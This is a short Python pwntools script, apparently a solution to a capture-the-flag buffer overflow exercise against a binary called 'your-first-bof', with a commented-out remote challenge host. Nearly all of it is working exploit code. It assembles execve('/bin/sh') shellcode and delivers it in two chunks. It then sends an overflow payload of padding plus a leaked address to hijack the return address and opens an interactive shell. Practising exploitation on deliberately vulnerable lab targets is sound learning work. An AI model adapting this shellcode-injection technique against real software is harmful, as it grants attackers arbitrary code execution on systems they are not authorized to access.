# The first shellcode works (2024-05-15 Wed)

from pwn import *

# context.log_level = 'debug'

p = process('./your-first-bof')
# p = remote('141.164.48.98', '30003')

shellcode = asm(shellcraft.execve('/bin/sh', 0, 0))

p.recvuntil(b':')
addr1 = int(p.recvline(), 16)

p.recvuntil(b':')
addr2 = int(p.recvline(), 16)

p.recvuntil(b'>>>')
p.sendline(shellcode[0:16])

p.recvuntil(b'>>>')
p.sendline(shellcode[16:])

print(hex(addr1), '\n', hex(addr2))
print(f'shellcode len: {len(shellcode)}')

addr = addr1
payload = b''
payload += b'A' * 0x1C
payload += addr.to_bytes(4, 'little')

p.recvuntil(b':')

# pause()
p.sendline(payload)

p.interactive()
